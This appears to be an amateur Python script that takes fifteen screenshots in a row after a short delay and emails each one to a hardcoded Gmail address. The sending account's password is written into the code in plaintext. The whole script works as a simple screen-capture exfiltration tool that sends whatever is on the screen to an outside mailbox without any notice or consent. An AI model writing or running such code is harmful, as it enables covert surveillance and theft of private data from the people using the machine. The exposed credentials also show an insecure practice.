# I don’t know how this shit works but it works

import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import pyautogui
import time

# while timer
sender_email = "PlanshetGreg@gmail.com"
receiver_email = "OneGreg0ry4k@gmail.com"


time.sleep(6)
for i in range(15):
    screenshot = pyautogui.screenshot()
    screenshot.save("screenshot1.png")
    # copied from documentation uwu

    message = MIMEMultipart()
    message["From"] = sender_email
    message['To'] = receiver_email
    message['Subject'] = "Report" + str(i)
    # Get file
    file = "screenshot1.png"
    attachment = open(file, 'rb')
    # Send mail
    # I don’t know what this shit does but it works
    obj = MIMEBase('application', 'octet-stream')
    obj.set_payload((attachment).read())
    encoders.encode_base64(obj)
    obj.add_header('Content-Disposition',"attachment; filename= " + file)
    message.attach(obj)
    my_message = message.as_string()
    email_session = smtplib.SMTP('smtp.gmail.com', 587)
    email_session.starttls()
    email_session.login(sender_email, 'SofaNeLox')
    email_session.sendmail(sender_email, receiver_email,my_message)
    email_session.quit()
    print("Email send success")
